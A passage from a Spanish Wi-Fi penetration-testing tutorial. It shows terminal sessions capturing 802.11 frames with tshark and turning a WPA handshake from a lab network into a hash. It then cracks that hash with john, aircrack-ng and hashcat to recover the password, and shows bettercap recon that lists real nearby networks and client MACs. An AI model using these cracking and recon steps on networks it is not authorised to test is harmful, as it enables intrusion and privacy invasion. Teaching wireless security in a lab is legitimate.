	DirecciÃ³n MAC: E8:D1:1B:21:2F:96
	Vendor: ASKEY COMPUTER CORP
 MOVISTAR_5A18 
	DirecciÃ³n MAC: A4:2B:B0:FB:90:D1
	Vendor: TP-LINK TECHNOLOGIES CO.,LTD.
 WIFI_EXT2 
	DirecciÃ³n MAC: 44:48:C1:F1:96:A3
	Vendor: Hewlett Packard Enterprise
 No es posible obtener el nombre de la red (ESSID)
	DirecciÃ³n MAC: 44:48:C1:F1:96:A1
	Vendor: Hewlett Packard Enterprise
 VILLACRISIS 
	DirecciÃ³n MAC: 84:16:F9:5B:45:B8
	Vendor: TP-LINK TECHNOLOGIES CO.,LTD.
 No es posible obtener el nombre de la red (ESSID)
	DirecciÃ³n MAC: 44:48:C1:F1:96:A2
	Vendor: Hewlett Packard Enterprise
 MOVISTAR_4C30 
	DirecciÃ³n MAC: E2:41:36:08:4C:30
	Vendor: InformaciÃ³n no encontrada en la base de datos
 TP-LINK_79D4 
	DirecciÃ³n MAC: D4:6E:0E:F8:79:D4
	Vendor: TP-LINK TECHNOLOGIES CO.,LTD.
 MOVISTAR_1677 
	DirecciÃ³n MAC: 1C:B0:44:D4:16:78
	Vendor: ASKEY COMPUTER CORP
 No es posible obtener el nombre de la red (ESSID)
	DirecciÃ³n MAC: 4C:1B:86:02:54:EA
	Vendor: Arcadyan Corporation

Estaciones no asociadas:

 34:12:F9:77:49:5E 
	Vendor: HUAWEI TECHNOLOGIES CO.,LTD
	Es probable que se trate de un dispositivo mÃ³vil
	Redes a las que el dispositivo ha estado asociado: BUY&RECICLE
 00:24:2B:BC:4E:57 
	Vendor: Hon Hai Precision Ind. Co.,Ltd.
	Redes a las que el dispositivo ha estado asociado: MAPFRE
 10:44:00:9C:76:66 
	Vendor: HUAWEI TECHNOLOGIES CO.,LTD
	Es probable que se trate de un dispositivo mÃ³vil
 4C:96:14:2C:47:40 
	Vendor: Juniper Networks
	Redes a las que el dispositivo ha estado asociado: MAPFRE
 AC:D1:B8:17:91:C0 
	Vendor: Hon Hai Precision Ind. Co.,Ltd.
```

Â¡QuÃ© belleza!, de bastante utilidad incluso para visualizar los paquetes **Probe Request**, contemplando las
redes a las que el cliente ha estado conectado en el pasado, pudiendo asÃ­ posteriormente efectuar un ataque de
tipo **Evil Twin**, que veremos mÃ¡s adelante.

### AnÃ¡lisis de paquetes de red con tshark

Hasta ahora hemos estado viendo diversos modos de filtro con **tshark** pero sin dedicar una secciÃ³n
especÃ­fica para los modos de filtro. A continuaciÃ³n, vamos a ver distintos modos de filtrado, de utilidad para
el anÃ¡lisis de paquetes y capturas:

* Paquetes Probe Request

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #tshark -i wlan0mon -Y "wlan.fc.type_subtype==4" 2>/dev/null
  175 22.140053472 JuniperN_2c:47:40 â†’ Broadcast    802.11 178 Probe Request, SN=2376, FN=0, Flags=........C, SSID=WLAN_C311
  185 26.153075819 Apple_ed:e2:63 â†’ Broadcast    802.11 214 Probe Request, SN=1959, FN=0, Flags=........C, SSID=Wlan1
  186 26.234864238 Apple_ed:e2:63 â†’ Broadcast    802.11 214 Probe Request, SN=1963, FN=0, Flags=........C, SSID=Wlan1
  187 26.245021241 Apple_ed:e2:63 â†’ Broadcast    802.11 214 Probe Request, SN=1964, FN=0, Flags=........C, SSID=Wlan1
  188 26.257907684 Apple_ed:e2:63 â†’ Broadcast    802.11 214 Probe Request, SN=1965, FN=0, Flags=........C, SSID=Wlan1
  189 26.268055504 Apple_ed:e2:63 â†’ Broadcast    802.11 214 Probe Request, SN=1966, FN=0, Flags=........C, SSID=Wlan1
```

* Paquetes Probe Response

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #tshark -r Captura-01.cap -Y "wlan.fc.type_subtype==5" 2>/dev/null
    2   1.617473 XiaomiCo_b1:c5:53 â†’ 32:7d:a9:4f:21:99 802.11 229 Probe Response, SN=1872, FN=0, Flags=........, BI=100, SSID=hacklab
    5   1.628735 XiaomiCo_b1:c5:53 â†’ 32:7d:a9:4f:21:99 802.11 229 Probe Response, SN=1874, FN=0, Flags=........, BI=100, SSID=hacklab
   10   3.698368 XiaomiCo_b1:c5:53 â†’ IntelCor_46:d1:38 802.11 210 Probe Response, SN=2340, FN=0, Flags=........, BI=100, SSID=hacklab
   12   3.701951 XiaomiCo_b1:c5:53 â†’ IntelCor_46:d1:38 802.11 210 Probe Response, SN=2341, FN=0, Flags=........, BI=100, SSID=hacklab
   14   3.756735 XiaomiCo_b1:c5:53 â†’ IntelCor_46:d1:38 802.11 210 Probe Response, SN=2342, FN=0, Flags=........, BI=100, SSID=hacklab
   16   3.759295 XiaomiCo_b1:c5:53 â†’ IntelCor_46:d1:38 802.11 210 Probe Response, SN=2343, FN=0, Flags=........, BI=100, SSID=hacklab
```

* Paquetes Association Request

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #tshark -r Captura-01.cap -Y "wlan.fc.type_subtype==0" 2>/dev/null
   22   5.041479 IntelCor_46:d1:38 â†’ XiaomiCo_b1:c5:53 802.11 122 Association Request, SN=227, FN=0, Flags=........, SSID=hacklab
```

* Paquetes Association Response

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #tshark -r Captura-01.cap -Y "wlan.fc.type_subtype==1" 2>/dev/null
   24   5.049663 XiaomiCo_b1:c5:53 â†’ IntelCor_46:d1:38 802.11 127 Association Response, SN=2346, FN=0, Flags=........
```

* Paquetes Beacon

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #tshark -r Captura-01.cap -Y "wlan.fc.type_subtype==8" 2>/dev/null
    1   0.000000 XiaomiCo_b1:c5:53 â†’ Broadcast    802.11 239 Beacon frame, SN=1855, FN=0, Flags=........, BI=100, SSID=hacklab
```

* Paquete Authentication

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #tshark -r Captura-01.cap -Y "wlan.fc.type_subtype==11" 2>/dev/null
   18   5.033280 IntelCor_46:d1:38 â†’ XiaomiCo_b1:c5:53 802.11 30 Authentication, SN=226, FN=0, Flags=........
   20   5.035840 XiaomiCo_b1:c5:53 â†’ IntelCor_46:d1:38 802.11 30 Authentication, SN=2344, FN=0, Flags=........
```

* Paquetes Deauthentication

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #tshark -i wlan0mon -Y "wlan.fc.type_subtype==12" 2>/dev/null
  200 39.994017471 AskeyCom_d4:16:78 â†’ Broadcast    802.11 38 Deauthentication, SN=0, FN=0, Flags=........
  201 39.994777432 AskeyCom_d4:16:78 â†’ Broadcast    802.11 39 Deauthentication, SN=0, FN=0, Flags=........
  202 39.996199413    Broadcast â†’ AskeyCom_d4:16:78 802.11 38 Deauthentication, SN=1, FN=0, Flags=........
  203 39.996798243    Broadcast â†’ AskeyCom_d4:16:78 802.11 39 Deauthentication, SN=1, FN=0, Flags=........
  205 39.999554640 AskeyCom_d4:16:78 â†’ Broadcast    802.11 38 Deauthentication, SN=2, FN=0, Flags=........
  206 40.000174666 AskeyCom_d4:16:78 â†’ Broadcast    802.11 39 Deauthentication, SN=2, FN=0, Flags=........
```

* Paquetes Dissasociation

```bash
tshark -i wlan0mon -Y "wlan.fc.type_subtype==10" 2>/dev/null # Para este caso no pude pillar ninguno jeje
```

* Paquetes Clear To Send (CTS)

```bash
â”Œâ”€[âœ—]â”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #tshark -i wlan0mon -Y "wlan.fc.type_subtype==28" 2>/dev/null
  183 11.333769733              â†’ XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
  186 11.334796342              â†’ XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
  189 11.336432358              â†’ XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
  192 11.339134653              â†’ XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
  196 11.352502740              â†’ XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
  199 11.357122880              â†’ XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
  204 11.362841524              â†’ XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
  222 11.418923972              â†’ AskeyCom_d4:16:78 (1c:b0:44:d4:16:78) (RA) 802.11 70 Clear-to-send, Flags=........C
  224 11.419977797              â†’ AskeyCom_d4:16:78 (1c:b0:44:d4:16:78) (RA) 802.11 70 Clear-to-send, Flags=........C
  226 11.427114234              â†’ AskeyCom_d4:16:78 (1c:b0:44:d4:16:78) (RA) 802.11 70 Clear-to-send, Flags=........C
  230 11.427645439              â†’ AskeyCom_d4:16:78 (1c:b0:44:d4:16:78) (RA) 802.11 70 Clear-to-send, Flags=........C
  235 11.430118052              â†’ XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
  240 11.434558344              â†’ XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
  243 11.435567660              â†’ XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
  246 11.441881524              â†’ XiaomiCo_b1:c5:53 (20:34:fb:b1:c5:53) (RA) 802.11 70 Clear-to-send, Flags=........C
```

* Paquetes ACK

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #tshark -i wlan0mon -Y "wlan.fc.type_subtype==29" 2>/dev/null
   44 2.532918866              â†’ XiaomiCo_d0:51:c5 (a4:50:46:d0:51:c5) (RA) 802.11 70 Acknowledgement, Flags=........C
  213 4.870822127              â†’ 72:4f:56:d5:f4:21 (72:4f:56:d5:f4:21) (RA) 802.11 70 Acknowledgement, Flags=........C
  214 4.872287210              â†’ 72:4f:56:27:f7:f5 (72:4f:56:27:f7:f5) (RA) 802.11 70 Acknowledgement, Flags=........C
  215 4.873060680              â†’ 72:4f:56:d5:f4:21 (72:4f:56:d5:f4:21) (RA) 802.11 70 Acknowledgement, Flags=........C
  231 5.792287268              â†’ Pegatron_5b:42:f6 (38:60:77:5b:42:f6) (RA) 802.11 70 Acknowledgement, Flags=........C
  252 6.105136504              â†’ Apple_24:f9:60 (70:14:a6:24:f9:60) (RA) 802.11 70 Acknowledgement, Flags=........C
  254 6.109740279              â†’ HewlettP_f1:96:a3 (44:48:c1:f1:96:a3) (RA) 802.11 70 Acknowledgement, Flags=........C
  268 6.137270470              â†’ Apple_24:f9:60 (70:14:a6:24:f9:60) (RA) 802.11 70 Acknowledgement, Flags=........C
  279 6.161518783              â†’ Apple_24:f9:60 (70:14:a6:24:f9:60) (RA) 802.11 70 Acknowledgement, Flags=........C
  281 6.165512928              â†’ Apple_24:f9:60 (70:14:a6:24:f9:60) (RA) 802.11 70 Acknowledgement, Flags=........C
```

#### ExtracciÃ³n del Hash en el Handshake

Aunque no es necesario, por si queremos saber con quÃ© estamos trabajando, es posible extraer el Hash
correspondiente a la captura donde se encuentra nuestro Handshake.

QuÃ© mejor que ver nuestro Handshake representado en formato Hash, tanto que hemos hablado de Ã©l como para no
prestarle un poco mÃ¡s de atenciÃ³n. Actualmente, **aircrack-ng** cuenta con el parÃ¡metro '**-J**', de utilidad
para generar un archivo de '**.hccap**'.

Â¿Por quÃ© queremos generar un archivo **HCCAP**?, porque luego a travÃ©s de la herramienta **hccap2john**
podemos transformar ese archivo a un hash, igual que como harÃ­amos como **ssh2john** u otra utilidad
semejante.

Por tanto, aquÃ­ una demostraciÃ³n:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #ls
Captura-01.cap
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #aircrack-ng -J miCaptura Captura-01.cap 
Opening Captura-01.cape wait...
Read 5110 packets.

   #  BSSID              ESSID                     Encryption

   1  20:34:FB:B1:C5:53  hacklab                   WPA (1 handshake)

Choosing first network as target.

Opening Captura-01.cape wait...
Read 5110 packets.

1 potential targets



Building Hashcat file...

[*] ESSID (length: 7): hacklab
[*] Key version: 2
[*] BSSID: 20:34:FB:B1:C5:53
[*] STA: 34:41:5D:46:D1:38
[*] anonce:
    FE AD BB C5 CA AC 3C 41 52 56 B1 44 5D 61 29 2A 
    72 E1 7D 73 6A 5E 16 A5 15 88 E4 9E 58 42 EC 78 
[*] snonce:
    47 5D 5A 50 E4 2D 1D 18 F8 67 5B 0A B6 B1 FF 1F 
    6A 85 82 EC 66 3E 92 2A F0 CC B2 05 F3 8B DE E0 
[*] Key MIC:
    0C 0E B7 91 69 C1 FE FD E5 D9 08 42 2E E4 A5 3C
[*] eapol:
    01 03 00 75 02 01 0A 00 00 00 00 00 00 00 00 00 
    01 47 5D 5A 50 E4 2D 1D 18 F8 67 5B 0A B6 B1 FF 
    1F 6A 85 82 EC 66 3E 92 2A F0 CC B2 05 F3 8B DE 
    E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 16 30 14 01 00 00 0F AC 04 01 00 00 0F AC 
    04 01 00 00 0F AC 02 00 00 

Successfully written to miCaptura.hccap

â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #ls
Captura-01.cap  miCaptura.hccap
```

Una vez hecho, hacemos uso de **hccap2john** para visualizar el hash:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #hccap2john miCaptura.hccap > miHash
â”Œâ”€[âœ—]â”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #cat !$
cat miHash
hacklab:$WPAPSK$hacklab#61HvgQJHB23RFh2sFppOICEh5FXsNpg8hf5z5qe3UilaDd6ewAmm/TC9ri1yfPj3mekwEJ7KgIFRMGYeQi3xQqdS3eIJWCGSK29gS.21.5I0.Ec............/FppOICEh5FXsNpg8hf5z5qe3UilaDd6ewAmm/TC9ri..................................................................3X.I.E..1uk2.E..1uk2.E..1uk0....................................................................................................................................................................................../t.....U....kCht3dkTvxtRY6EWvYdHk:34-41-5d-46-d1-38:20-34-fb-b1-c5-53:2034fbb1c553::WPA2:miCaptura.hccap
```

Y eso tan bonito que vemos, es el Hash correspondiente a la contraseÃ±a de la red WiFi, la cual podrÃ­amos
sencillamente crackear llegados hasta este punto haciendo uso de la herramienta **John** junto a un diccionario.


#### Fuerza bruta con John

Ya habiendo llegado hasta aquÃ­, procedemos con los ataques de fuerza bruta. Aprovechando el punto
anteriormente visto, ya que contamos con un Hash... resulta sencillo crackear la contraseÃ±a de la red WiFi
haciendo uso de un diccionario a travÃ©s de la herramienta **John**, de la siguiente forma:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #john --wordlist=/usr/share/wordlists/rockyou.txt miHash --format=wpapsk
Using default input encoding: UTF-8
Loaded 1 password hash (wpapsk, WPA/WPA2/PMF/PMKID PSK [PBKDF2-SHA1 256/256 AVX2 8x])
No password hashes left to crack (see FAQ)
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #john --show --format=wpapsk miHash 
hacklab:vampress1:34-41-5d-46-d1-38:20-34-fb-b1-c5-53:2034fbb1c553::WPA2:miCaptura.hccap

1 password hash cracked, 0 left
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #echo "Password: $(john --show --format=wpapsk miHash | cut -d ':' -f 2)"
Password: vampress1
```

Y ahÃ­ dispondrÃ­amos de la contraseÃ±a de la red inalÃ¡mbrica, que en este caso es **vampress1**.

#### Fuerza bruta con Aircrack

Para crackear nuestro Handshake desde la propia suite de **aircrack**, tan sÃ³lo tendrÃ­amos que emplear esta
sintaxis:

* aircrack-ng -w rutaDiccionario Captura-01.cap

Se iniciarÃ­a el proceso de fuerza bruta y una vez obtenida se detendrÃ­a la fase de cracking, mostrando la
contraseÃ±a siempre y cuando esta se encuentre en el diccionario especificado:

```bash
                              Aircrack-ng 1.5.2 

      [00:00:43] 487370/9822769 keys tested (7440.27 k/s) 

      Time left: 20 minutes, 54 seconds                          4.96%

                           KEY FOUND! [ vampress1 ]


      Master Key     : 9C E8 4E 94 F4 08 12 AC 1F 06 C9 5F CF C8 DE D5 
                       EC 70 5C 4B 73 FE 52 7B 02 29 9F 9A 88 E2 B3 74 

      Transient Key  : C6 21 8D E8 62 DD B2 A7 48 65 52 AA E0 C0 8E 85 
                       1B 63 D0 1D 9C C0 47 12 DA BF E1 63 12 01 8C 75 
                       D3 EF AE C5 E4 62 B7 C7 6E DE D1 05 9D 67 81 BF 
                       E7 94 71 D0 8D FE 92 17 61 AC 44 BA 48 E6 F7 B3 

      EAPOL HMAC     : 1A EB 42 13 85 E4 A1 FC 99 AF AA 97 4D AA EE 25
```

La velocidad de cÃ³mputo siempre va a depender de nuestra CPU, pero veremos un par de tÃ©cnicas mÃ¡s adelante
para aumentar nuestra velocidad de cÃ³mputo, superando las 10 millones de contraseÃ±as por segundo.

#### Fuerza bruta con Hashcat

Ya que **aircrack** no es capaz de tirar por GPU, en caso de que tengÃ¡is una GPU como en mi caso:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #nvidia-detect 
Detected NVIDIA GPUs:
01:00.0 VGA compatible controller [0300]: NVIDIA Corporation GP107M [GeForce GTX 1050 Mobile] [10de:1c8d] (rev a1)
```

Lo mejor es tirar de **Hashcat** para estos casos. Para correr la herramienta, primero necesitamos saber cuÃ¡l
es el mÃ©todo numÃ©rico correspondiente a **WPA**:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #hashcat -h | grep -i wpa
   2500 | WPA-EAPOL-PBKDF2                                 | Network Protocols
   2501 | WPA-EAPOL-PMK                                    | Network Protocols
  16800 | WPA-PMKID-PBKDF2                                 | Network Protocols
  16801 | WPA-PMKID-PMK                                    | Network Protocols
```

Una vez identificado (**2500**), lo primero que necesitamos hacer es convertir nuestra captura '**.cap**' a un
archivo de tipo '**.hccapx**', especÃ­fico para la combinaciÃ³n de Hashcat. Para ello, corremos el parÃ¡metro
'**-j**' de aircrack (esta vez es minÃºscula):

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #aircrack-ng -j hashcatCapture Captura-01.cap 
Opening Captura-01.cape wait...
Read 5110 packets.

   #  BSSID              ESSID                     Encryption

   1  20:34:FB:B1:C5:53  hacklab                   WPA (1 handshake)

Choosing first network as target.

Opening Captura-01.cape wait...
Read 5110 packets.

1 potential targets



Building Hashcat (3.60+) file...

[*] ESSID (length: 7): hacklab
[*] Key version: 2
[*] BSSID: 20:34:FB:B1:C5:53
[*] STA: 34:41:5D:46:D1:38
[*] anonce:
    FE AD BB C5 CA AC 3C 41 52 56 B1 44 5D 61 29 2A 
    72 E1 7D 73 6A 5E 16 A5 15 88 E4 9E 58 42 EC 78 
[*] snonce:
    47 5D 5A 50 E4 2D 1D 18 F8 67 5B 0A B6 B1 FF 1F 
    6A 85 82 EC 66 3E 92 2A F0 CC B2 05 F3 8B DE E0 
[*] Key MIC:
    0C 0E B7 91 69 C1 FE FD E5 D9 08 42 2E E4 A5 3C
[*] eapol:
    01 03 00 75 02 01 0A 00 00 00 00 00 00 00 00 00 
    01 47 5D 5A 50 E4 2D 1D 18 F8 67 5B 0A B6 B1 FF 
    1F 6A 85 82 EC 66 3E 92 2A F0 CC B2 05 F3 8B DE 
    E0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
    00 00 16 30 14 01 00 00 0F AC 04 01 00 00 0F AC 
    04 01 00 00 0F AC 02 00 00 

Successfully written to hashcatCapture.hccapx

â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop/Red]
â””â”€â”€â•¼ #ls
Captura-01.cap  hashcatCapture.hccapx
```

Ya en posesiÃ³n de esta captura, iniciamos la fase de cracking haciendo uso de la siguiente sintaxis:

* hashcat -m 2500 -d 1 rockyou.txt --force -w 3

Obteniendo los siguientes resultados en un tiempo rÃ©cord:

```bash
â”Œâ”€[âœ—]â”€[root@parrot]â”€[/usr/share/wordlists]
â””â”€â”€â•¼ #hashcat -m 2500 -d 1 hashcatCapture.hccapx rockyou.txt 
hashcat (v5.1.0) starting...

OpenCL Platform #1: NVIDIA Corporation
======================================
* Device #1: GeForce GTX 1050, 1010/4040 MB allocatable, 5MCU

OpenCL Platform #2: The pocl project
====================================
* Device #2: pthread-Intel(R) Core(TM) i7-7700HQ CPU @ 2.80GHz, skipped.

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Minimum password length supported by kernel: 8
Maximum password length supported by kernel: 63

Watchdog: Temperature abort trigger set to 90c

* Device #1: build_opts '-cl-std=CL1.2 -I OpenCL -I /usr/share/hashcat/OpenCL -D LOCAL_MEM_TYPE=1 -D VENDOR_ID=32 -D CUDA_ARCH=601 -D AMD_ROCM=0 -D VECT_SIZE=1 -D DEVICE_TYPE=4 -D DGST_R0=0 -D DGST_R1=1 -D DGST_R2=2 -D DGST_R3=3 -D DGST_ELEM=4 -D KERN_TYPE=2500 -D _unroll'
Dictionary cache hit:
* Filename..: rockyou.txt
* Passwords.: 14344386
* Bytes.....: 139921517
* Keyspace..: 14344386

ebe21289a38f16ee01a35c240c356e5f:2034fbb1c553:34415d46d138:hacklab:vampress1
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: WPA-EAPOL-PBKDF2
Hash.Target......: hacklab (AP:20:34:fb:b1:c5:53 STA:34:41:5d:46:d1:38)
Time.Started.....: Sun Aug 11 19:12:43 2019 (4 secs)
Time.Estimated...: Sun Aug 11 19:12:47 2019 (0 secs)
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    79177 H/s (7.18ms) @ Accel:128 Loops:64 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 807901/14344386 (5.63%)
Rejected.........: 439261/807901 (54.37%)
Restore.Point....: 728207/14344386 (5.08%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 22lehvez33 -> rodnesha
Hardware.Mon.#1..: Temp: 63c Util: 92% Core:1670MHz Mem:3504MHz Bus:8

```

Recuerda hacer uso del parÃ¡metro **-d** para especificar el dispositivo a usar. Si queremos listar la
contraseÃ±a una vez crackeada (aunque tambiÃ©n la vemos en el output listado anteriormente), podemos hacer lo
siguiente:

```bash
â”Œâ”€[root@parrot]â”€[/usr/share/wordlists]
â””â”€â”€â•¼ #hashcat --show -m 2500 hashcatCapture.hccapx 
ebe21289a38f16ee01a35c240c356e5f:2034fbb1c553:34415d46d138:hacklab:vampress1
```

En este caso, para los curiosos, haciendo uso de una **GeForce GTX 1050** estarÃ­amos yendo a 79.177 Hashes por
segundo, lo cual hace que en cuestiÃ³n de segundos nos podamos recorrer todo el rockyou entero.

#### Proceso de ataque con Bettercap

Todo el proceso llevado a cabo hasta ahora, puede ser realizado desde **Bettercap**. SÃ­ que es cierto que
aunque para el caso visto prefiero tirar del mÃ©todo convencional, en ocasiones uso **Bettercap** para los
ataques de PKMID que explicarÃ© mÃ¡s adelante, para redes WPA/WPA2 sin clientes.

Lo primero de todo para llevar a cabo el procedimiento, es poner nuestra tarjeta de red en modo monitor tal y
como se detallÃ³ en los puntos anteriormente vistos. Posteriormente, desde **Bettercap**, podemos hacer lo
siguiente:

```bash
â”Œâ”€[root@parrot]â”€[/opt/bettercap]
â””â”€â”€â•¼ #./bettercap -iface wlan0mon
bettercap v2.24.1 (built for linux amd64 with go1.10.4) [type 'help' for a list of commands]

 wlan0mon  Â» wifi.recon on
[21:07:22] [sys.log] [inf] wifi using interface wlan0mon (e4:70:b8:d3:93:5c)
[21:07:22] [sys.log] [inf] wifi started (min rssi: -200 dBm)
[21:07:22] [sys.log] [inf] wifi channel hopper started.
 wlan0mon  Â» [21:07:22] [wifi.ap.new] wifi access point MOVISTAR_49BA (-92 dBm) detected as 84:aa:9c:f1:49:bc (MitraStar Technology Corp.).
 wlan0mon  Â» [21:07:22] [wifi.ap.new] wifi access point MOVISTAR_2F95 (-93 dBm) detected as e8:d1:1b:21:2f:96 (Askey Computer Corp).
 wlan0mon  Â» [21:07:22] [wifi.ap.new] wifi access point LowiF7D3 (-84 dBm) detected as 10:62:d0:f6:f7:d8 (Technicolor CH USA Inc.).
 wlan0mon  Â» [21:07:22] [wifi.ap.new] wifi access point MOVISTAR_A908 (-90 dBm) detected as fc:b4:e6:99:a9:09 (Askey Computer Corp).
 wlan0mon  Â» [21:07:22] [wifi.ap.new] wifi access point devolo-30d32d583e03 (-96 dBm) detected as 30:d3:2d:58:3e:03 (devolo AG).
 wlan0mon  Â» [21:07:24] [wifi.ap.new] wifi access point MOVISTAR_1677 (-54 dBm) detected as 1c:b0:44:d4:16:78 (Askey Computer Corp).
 wlan0mon  Â» [21:07:24] [wifi.ap.new] wifi access point MIWIFI_psGP (-94 dBm) detected as 50:78:b3:ee:bb:ac.
 wlan0mon  Â» [21:07:25] [wifi.ap.new] wifi access point Wlan1 (-81 dBm) detected as f8:8e:85:df:3e:13 (Comtrend Corporation).
 wlan0mon  Â» [21:07:27] [wifi.ap.new] wifi access point linksys (-73 dBm) detected as 00:12:17:70:d5:2c (Cisco-Linksys, LLC).
 wlan0mon  Â» [21:07:27] [wifi.ap.new] wifi access point devolo-30d32d583c6b (-82 dBm) detected as 30:d3:2d:58:3c:6b (devolo AG).
 wlan0mon  Â» [21:07:27] [wifi.client.new] new station 78:4f:43:24:01:4e (Apple, Inc.) detected for linksys (00:12:17:70:d5:2c)
 wlan0mon  Â» [21:07:27] [wifi.ap.new] wifi access point MOVISTAR_3126 (-93 dBm) detected as cc:d4:a1:0c:31:28 (MitraStar Technology Corp.).
 wlan0mon  Â» [21:07:27] [wifi.ap.new] wifi access point vodafone4038 (-92 dBm) detected as 28:9e:fc:0c:40:3e (Sagemcom Broadband SAS).
 wlan0mon  Â» [21:07:27] [wifi.client.new] new station f0:7b:cb:04:d7:37 (Hon Hai Precision Ind. Co.,Ltd.) detected for linksys (00:12:17:70:d5:2c)
```

Es decir, a travÃ©s del comando **wifi.recon on**, monitorizamos las redes disponibles del entorno, tal y como
lo harÃ­amos desde **airodump**. Una vez hecho, por comodidad, filtramos los resultados por el nÃºmero de
clientes/estaciones disponibles para los distintos AP's:

```bash
 wlan0mon  Â» set wifi.show.sort clients desc
 ```

 Por Ãºltimo, a travÃ©s de la utilidad **ticker**, podemos especificar los comandos que queramos que se ejecuten
 a intervalos regulares de tiempo. En mi caso, especificarÃ© que quiero hacer una limpieza de pantalla seguido
 de la operaciÃ³n **wifi.show**, que se encargarÃ¡ de listarme los puntos de acceso disponibles en el entorno en
base al criterio de filtrado a nivel de clientes que especifiquÃ© en la operaciÃ³n anterior:

```bash
 wlan0mon  Â» set ticker.commands 'clear; wifi.show'
 wlan0mon  Â» ticker on
```

Una vez presionemos la tecla 'Enter', obtendremos unos resultados como estos:

```bash
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  RSSI   â”‚       BSSID       â”‚        SSID         â”‚    Encryption    â”‚         WPS          â”‚ Ch  â”‚ Clients â–¾ â”‚  Sent  â”‚ Recvd â”‚   Seen   â”‚
